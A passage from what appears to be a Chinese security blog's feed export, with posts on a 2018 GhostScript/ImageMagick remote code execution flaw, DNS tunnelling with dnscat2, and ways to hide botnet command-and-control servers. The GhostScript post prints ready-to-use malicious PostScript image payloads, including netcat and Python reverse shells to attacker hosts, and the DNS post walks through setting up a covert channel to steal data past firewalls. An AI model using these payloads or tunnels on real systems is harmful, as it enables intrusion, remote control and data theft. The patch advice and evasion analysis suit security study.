title="加权投票法（软投票）"></a>加权投票法（软投票）</h4><p>加权投票法会返回预测各个类的概率加权平均值，然后取其中最大平均概率的分类做为预测结果。</p><p>可以用表格清晰的表示出来</p><table><thead><tr><th>分类器</th><th>类别1</th><th>类别2</th><th>类别3</th></tr></thead><tbody><tr><td>分类器1</td><td>w1*0.2</td><td>w1*0.5</td><td>w1*0.3</td></tr><tr><td>分类器2</td><td>w2*0.6</td><td>w2*0.3</td><td>w2*0.1</td></tr><tr><td>分类器3</td><td>w3*0.3</td><td>w2*0.4</td><td>w2*0.3</td></tr></tbody></table><p>在预测时，计算每一类的加权平均值比较即可。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GhostScript命令执行漏洞</title>
    <link href="/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天早上 <a href="http://seclists.org/oss-sec/2018/q3/142">http://seclists.org/oss-sec/2018/q3/142</a> 曝出了这个imageMagick的漏洞，然后下午从朋友那里听说了，这个漏洞影响范围极广，有缩略图功能的各种网站都有机会中招。当时看着大佬们在百度、新浪等各大厂商的src提交漏洞报告薅赏金的时候，自己也想尝试尝试，奈何手边没有电脑，只能等到晚上回来复现。</p><p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce01.png?raw=true"></p><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>GhostScript插件被许多图片处理库如 ImageMagick、Python PIL 等所使用，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括GhostScript。</p><p>而GhostScript的安全沙箱可以通过构造恶意代码绕过，当我们构造恶意代码并重命名成图片的格式，上传至目标服务器时，目标服务器的图像处理模块（为了完成如头像缩略图等功能）就会触发构造的恶意代码，造成远程代码执行。</p><p>也正是因为使用这些图像处理模块的网站十分多，所以漏洞影响范围极大，对于我们学生党来说，是个刷SRC赚点零花钱的好机会。</p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>作者给出的测试poc有两种，分别针对centos和ubuntu：</p><h3 id="For-Ubuntu"><a href="#For-Ubuntu" class="headerlink" title="For Ubuntu"></a>For Ubuntu</h3><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs puppet">%!PS<br>userdict /setpagedevice undef<br>save<br>legal<br>&#123; null restore &#125; <span class="hljs-keyword">stopped</span> &#123; pop &#125; <span class="hljs-keyword">if</span><br>&#123; legal &#125; <span class="hljs-keyword">stopped</span> &#123; pop &#125; <span class="hljs-keyword">if</span><br><span class="hljs-keyword">restore</span><br><span class="hljs-keyword">mark</span> /OutputFile (%pipe%id) currentdevice putdeviceprops<br></code></pre></td></tr></table></figure><p>将这样一张图片上传后，经过GhostScript就会触发id命令</p><p>我们在本地可以通过imageMagick的图像压缩功能测试一下，首先安装imageMagick</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install imageMagick<br></code></pre></td></tr></table></figure><p>然后使用convert命令压缩图片触发命令：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">convert</span> shellexe.jpeg whatever.gif<br></code></pre></td></tr></table></figure><p>显示如下信息说明测试成功：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uid</span>=<span class="hljs-number">1000</span>(taviso) gid=<span class="hljs-number">1000</span>(taviso) groups=<span class="hljs-number">1000</span>(taviso),<span class="hljs-number">10</span>(wheel)<br><span class="hljs-attribute">context</span>=unconfined_u:unconfined_r:unconfined_t:s<span class="hljs-number">0</span>-s<span class="hljs-number">0</span>:c<span class="hljs-number">0</span>.c<span class="hljs-number">1023</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce02.png?raw=true"></p><h3 id="For-CentOS"><a href="#For-CentOS" class="headerlink" title="For CentOS"></a>For CentOS</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">%<span class="hljs-title">!PS</span><br>userdict /setpagedevice <span class="hljs-keyword">undef</span><br>legal<br>&#123; <span class="hljs-keyword">null</span> restore &#125; stopped &#123; pop &#125; if<br>legal<br>mark /OutputFile (<span class="hljs-variable">%pipe</span><span class="hljs-variable">%id</span>) currentdevice putdeviceprops<br></code></pre></td></tr></table></figure><p>centos中除了payload不同以外，其他过程都相同，不过安装imageMagicK需要使用</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> imageMagicK<br></code></pre></td></tr></table></figure><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>这两种linux系统中都可以验证漏洞存在了，那么我们该如何利用它呢？</p><p>虽然我们每次直接改id再上传使服务器执行命令也可以，但是未免太过麻烦，想要方便的控制肯定是得反弹一个shell，我这里提供两种方法：</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>第一种是反弹一个netcat的连接，因为大部分的linux都会自带nc，我们只需要将id命令改成反弹一个nc到我们监听的服务器和端口即可：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">%!PS<br>userdict /setpagedevice undef<br>legal<br>&#123; null restore &#125; stopped &#123; pop &#125; <span class="hljs-keyword">if</span><br>legal<br>mark /OutputFile (%pipe%<span class="hljs-constructor">$(<span class="hljs-params">nc</span> -<span class="hljs-params">e</span> <span class="hljs-operator">/</span><span class="hljs-params">bin</span><span class="hljs-operator">/</span><span class="hljs-params">sh</span> <span class="hljs-params">xxx</span>.<span class="hljs-params">xxx</span>.<span class="hljs-params">xxx</span>.<span class="hljs-params">xxx</span> 1234)</span>) currentdevice putdeviceprops<br></code></pre></td></tr></table></figure><p>只要将恶意代码中xxx.xxx.xxx.xxx改为自己的ip，将1234改为自己监听的端口就可以使用了。</p><h3 id="python-shell"><a href="#python-shell" class="headerlink" title="python shell"></a>python shell</h3><p>当然也不排除一些服务器没有nc，这种时候就用第二种方法：反弹一个python shell，linux中基本都是装了python的</p><p>python版本的shell编写可以参考我前面的博客 </p><p>我这里也给出一个直接可以利用的payload：</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs puppet">%!PS<br>userdict /setpagedevice undef<br>save<br>legal<br>&#123; null restore &#125; <span class="hljs-keyword">stopped</span> &#123; pop &#125; <span class="hljs-keyword">if</span><br>&#123; legal &#125; <span class="hljs-keyword">stopped</span> &#123; pop &#125; <span class="hljs-keyword">if</span><br><span class="hljs-keyword">restore</span><br><span class="hljs-keyword">mark</span> /OutputFile (%pipe%python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.100&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span>) currentdevice putdeviceprops<br></code></pre></td></tr></table></figure><p>上述两种方法都还需要我们在自己远程监听的服务器上打开一个nc的监听：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>然后上传图片，如果攻击成功就可以得到shell：</p><p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce03.png?raw=true"></p><p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce04.png?raw=true"></p><h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><p>暂时官方没有补丁，可以参考长亭安全团队给出的临时解决方案：</p><ul><li><p>1.卸载 GhostScript<br>以 Ubuntu 系统为例，执行以下命令以卸载 GhostScript：<br>sudo apt-get remove ghostscript</p></li><li><p>2.修改 ImageMagick 的 policy 文件，默认位置为 /etc/ImageMagick/policy.xml，在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;policymap&gt;<br>  &lt;<span class="hljs-keyword">policy</span> <span class="hljs-keyword">domain</span>=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot; /&gt;<br>  &lt;<span class="hljs-keyword">policy</span> <span class="hljs-keyword">domain</span>=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPS&quot; /&gt;<br>  &lt;<span class="hljs-keyword">policy</span> <span class="hljs-keyword">domain</span>=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PDF&quot; /&gt;<br>  &lt;<span class="hljs-keyword">policy</span> <span class="hljs-keyword">domain</span>=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;XPS&quot; /&gt;<br>&lt;/policymap&gt;<br></code></pre></td></tr></table></figure></li></ul><p>不过很快官方补丁就会给出，那时就可以直接更新imageMagicK</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用DNS Tunnel传输数据</title>
    <link href="/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/"/>
    <url>/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p><p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p><p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p><h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p><h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p><p>DNS Tunnel可以分为直连和中继两种。</p><p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p><p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p><p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p><p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p><p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p><h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p><p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p><p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p><p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">ruby</span> <span class="hljs-keyword">ruby</span>-dev git <span class="hljs-keyword">make</span> g++ rubygems<br>gem <span class="hljs-keyword">update</span> --<span class="hljs-built_in">system</span><br>gem install bundler<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/server<br>bundle install<br></code></pre></td></tr></table></figure><p>出现几行绿色字体如下所示就代表安装完成了：</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true"></p><p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true"></p><p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p><p>linux-client端部署代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iagox86/</span>dnscat2.git<br>cd dnscat2<span class="hljs-regexp">/client/</span><br>make<br></code></pre></td></tr></table></figure><p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p><p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p><p>我们首先在server端开启隧道：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ruby ./dnscat2<span class="hljs-selector-class">.rb</span> dns<span class="hljs-selector-class">.uuzdaisuki</span><span class="hljs-selector-class">.com</span> --no-cache<br></code></pre></td></tr></table></figure><p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true"></p><p>然后将上面产生的这串secret复制下来，要在client中使用。</p><p>client中运行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./dnscat --dns <span class="hljs-attribute">domain</span>=dns.uuzdaisuki.com <span class="hljs-attribute">--secret</span>=xxxxxxxxxxxxxxxxxxxxx<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true"></p><p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p><p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true"></p><p>使用如下代码可以进去这个session</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">session</span> -i <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后使用help可以查看可以使用的命令：</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true"></p><p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true"></p><p>之后就可以使用命令交互：</p><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true"></p><p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">listen</span> [lhost:]l<span class="hljs-keyword">port</span> rhost:rport<br></code></pre></td></tr></table></figure><p>比如我们要通过对方网络访问百度，那就是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">listen</span></span> <span class="hljs-number">1234</span> www.baidu.com:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p><p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p><h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true"></p><p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p><p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C&amp;C控制服务思路浅析</title>
    <link href="/2018/08/03/C-C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E6%80%9D%E8%B7%AF%E6%B5%85%E6%9E%90/"/>
    <url>/2018/08/03/C-C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E6%80%9D%E8%B7%AF%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的博客中写过一次用python实现的后门 <a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a> 里面的代码用最简单的例子来实现了远程控制。</p><p>但是当我们想要构建大规模僵尸网络的时候，就会发现这类简单的后门很不方便，我们不可能有时间一个一个手动的进行控制。而且大部分的肉鸡ip都是一直在变动而且无法直接访问的，所以远控中基本都使用反弹式通信，反弹式通信需要肉鸡每隔一段时间对我们的控制机发送心跳包，但是我们自己的电脑，ip很多情况也都是一直在变动的，我们很难保证自己拥有一个不变的公网ip。为了避免这些问题，我们就需要一台能够集中统一控制僵尸网络的主机，也就是C&amp;C服务器。</p><ul><li>C&amp;C服务器：command and control server(命令与控制服务器)。一般是指挥控制僵尸网络的主控服务器，用来和每个肉鸡进行通信并指挥它们的攻击行为。</li></ul><p>当然我这篇并不打算写一个简单的主控脚本和远控脚本，然后把它部署到公网服务器中，毕竟这些步骤只需要稍微改一下最开始那个链接里面脚本的代码就可以了。这篇我想要对通过各种方法部署和隐藏C&amp;C服务器的方法做一个总结。</p><h2 id="0x01-通过IP地址访问C-amp-C服务器"><a href="#0x01-通过IP地址访问C-amp-C服务器" class="headerlink" title="0x01 通过IP地址访问C&amp;C服务器"></a>0x01 通过IP地址访问C&amp;C服务器</h2><p>最简单的方法就是租用一台云服务器，将服务器ip直接写远控脚本中反弹的ip中，然后所有肉鸡都会每隔一段时间与这个ip进行一次通信，我们也就可以在服务器上用脚本控制僵尸网络发动攻击。</p><p>但是由于ip地址是直接写死在远控脚本或远控程序中的，如果对方捕获了远控脚本或者远控程序，进行简单的二进制逆向扫描就可以得到我们服务器ip地址，并且对方机器经常访问同一个ip也会增加被发现的几率。一旦被发现，对方直接将ip加入黑名单，并且将ip提交给我们购买云服务器的提供商，服务器被封禁就会使远控全部失效。</p><p>优点：简单易实现、耗费小(仅服务器开销)。</p><p>缺点：极易被发现、很容易大规模失效。</p><h2 id="0x02-通过域名访问C-amp-C服务器"><a href="#0x02-通过域名访问C-amp-C服务器" class="headerlink" title="0x02 通过域名访问C&amp;C服务器"></a>0x02 通过域名访问C&amp;C服务器</h2><p>通过域名再指向服务器比起直接指向服务器只是将反弹ip改为反弹的域名。如果注册一些较正常的域名并且做一个伪装的主页，被发现的几率就会降低，而且直接二进制扫描不会被发现。但是逆向程序或着搭建蜜罐进行动态测试，很容易就能追踪到这些域名，将域名丢给运营商的黑名单就会造成大规模的远控失效。</p><p>不过比起仅通过ip地址访问这种方式要多花去安全人员的一点时间，如果在这个时间内达成目的，也算是成功了。</p><p>优点：简单易实现、耗费小(服务器和域名开销)。</p><p>缺点：易被发现、很容易大规模失效。</p><h2 id="0x03-Fast-flux"><a href="#0x03-Fast-flux" class="headerlink" title="0x03 Fast flux"></a>0x03 Fast flux</h2><p>如果一个域名很容易被蜜罐捕获的话，我们可以将几十个域名分散的写在代码中，这些域名都指向同一台服务器的ip地址，程序会对域名轮换访问，然后提供一个较短的ttl使域名对ip的解析记录也会不断的更换。</p><p>这样被捕获某一部分域名添加黑名单并没有办法阻止恶意软件。而且因为ip解析记录一直变更也无法直接举报服务器，所以需要安全人员很高的逆向能力将恶意域名全部找出来。</p><p>不过这个方式有两个缺陷，一个是将捕获的一部分恶意域名的ip解析历史记录进行统计、数据分析，也会很快找到服务器的ip地址。另一个缺陷是域名记录的TTL相比正常的过短，容易被抓住特征。</p><p>优点：被发现后较难快速处理、被屏蔽一部分域名不会造成僵尸网络失效。</p><p>缺点：实现需要足够的代码混淆和隐藏能力、耗费较大(多个域名的开销)、一旦服务器ip被发现仍然会大规模失效。</p><h2 id="0x04-Double-flux、Triple-flux"><a href="#0x04-Double-flux、Triple-flux" class="headerlink" title="0x04 Double flux、Triple flux"></a>0x04 Double flux、Triple flux</h2><p>既然Fast flux容易被捕获一部分恶意域名进行数据分析而发现ip，那域名能增加ip也能增加，Double flux就是在一般的fast flux过程中除了轮换域名，也让ip可以轮换，如果我们有M个域名和N个ip这样就产生了M*N组的C&amp;C通道，还有更多的干扰项。</p><p>Triple flux在Double flux的基础上，增加一层Name Server通过CNAME方式解析，这样域名有可能指向ip也有可能指向别的域名，然后再指向ip，这些Name Server也会定期轮换，就增加了更多C&amp;C通道和干扰项。</p><p>这两种方法都增加了安全人员分析的难度，而且不会因为个别的服务器或域名被封禁导致僵尸网络失效，但是仍然存在着和普通Fast flux一样的问题，那就是因为域名到ip的解析一直轮换导致TTL需要设置很短，很容易被抓取特征而捕获。</p><p>优点：被发现后较难快速处理、被屏蔽一部分域名、封禁一部分ip都不会造成僵尸网络失效。</p><p>缺点：实现需要足够的代码混淆和隐藏能力、耗费很大(多个域名和多个服务器的开销)。</p><h2 id="0x05-使用论坛等作为C-amp-C服务器"><a href="#0x05-使用论坛等作为C-amp-C服务器" class="headerlink" title="0x05 使用论坛等作为C&amp;C服务器"></a>0x05 使用论坛等作为C&amp;C服务器</h2><p>自己架设服务器很容易被封禁，然后丢失僵尸网络的控制权，有的攻击者想到一个绝佳的办法：通过在一些论坛的冷门区域发一些C&amp;C控制指令，然后让恶意软件通过爬虫在访问这些论坛的时候获取指令，最开始主要是在twitter上进行C&amp;C控制，这种情况一开始很让安全人员头疼，因为访问这些论坛的请求本就和正常数据包差不多很难被发现，而且就算发现了，总不能把twitter的域名或者服务器添加很名单吧，这会影响网络的正常使用。后来发现了这种情况可以进行举报，从而封禁对应的账号。</p><p>优点：耗费低、不是特别容易被发现。</p><p>缺点：被发现后会被直接封禁账号损失僵尸网络。</p><h2 id="0x06-使用随机域名生成算法"><a href="#0x06-使用随机域名生成算法" class="headerlink" title="0x06 使用随机域名生成算法"></a>0x06 使用随机域名生成算法</h2><p>比起注册一堆域名耗费巨大，更好的办法是使用DGA(Domain Generation Algorithm)算法，这种C&amp;C控制方法的思路就是控制一个确定的随机域名生成算法，用约定好的随机数种子生成大量的随机域名（如当天日期时间），恶意软件对这些域名全部进行访问，我们只需要按照规律注册其中个别有可能的域名就可以进行控制。</p><p>这个方法的重点在于没有任何确定的域名写入到恶意软件里，即使逆向也找不到真正的域名，而且逆向出这个随机算法的难度非常大。并且生成的随机域名数量十分巨大对方无法得知究竟我们注册了哪个域名。由于随机算法(提前设定好)和随机种子(可以根据时间等生成)都是我们不需要通信就可以得知的信息，我们任何时候都可以知道该注册那种类型的域名可以进行控制。</p><p>除非源码泄露，安全人员要逆向出DGA算法是非常困难的，也很难用黑名单的方式屏蔽掉所有的域名。目前应对这种C&amp;C的方法一般是利用机器学习算法去判定域名的随机性，然后筛选出有可能是恶意域名的域名进行分析找出ip，或者利用机器学习算法智能的屏蔽对这些域名的访问。</p><p>天下没有免费的午餐，这种方式比起前面的方法也有一个缺陷，产生的随机域名过多且访问频率有限的时候，想通过C&amp;C服务器进行控制就需要等待较长的时间，所以在攻击时灵活度不足。强行减少等待的时间就得增加访问频率，就会增加被发现的概率。</p><p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p><p>缺点：控制延迟很高、灵活度不足。</p><h2 id="0x07-使用变形DGA算法"><a href="#0x07-使用变形DGA算法" class="headerlink" title="0x07 使用变形DGA算法"></a>0x07 使用变形DGA算法</h2><p>这个方法是为了对抗检测域名随机性的机器学习算法而产生的，大体步骤和上面相似，不同处是比起使用域名随机算法，添加一些英文单词作为字典构成域名，就比较接近正常的网页，不会被普通的机器学习算法检测出来。</p><p>还是那句话，天下没有免费的午餐，添加字典减少了随机性，必然会缩小产生域名的数量，很快就会用完所有的域名。</p><p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p><p>缺点：控制延迟很高、灵活度不足。</p><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>C&amp;C的设计与防御是目前攻防中很重要的一部分，围绕着C&amp;C，双方在攻防博弈中各显神通，完美的结合了机器学习、数据科学等知识，是非常有学习和研究价值的。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C&amp;C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-scikit learn学习(2)</title>
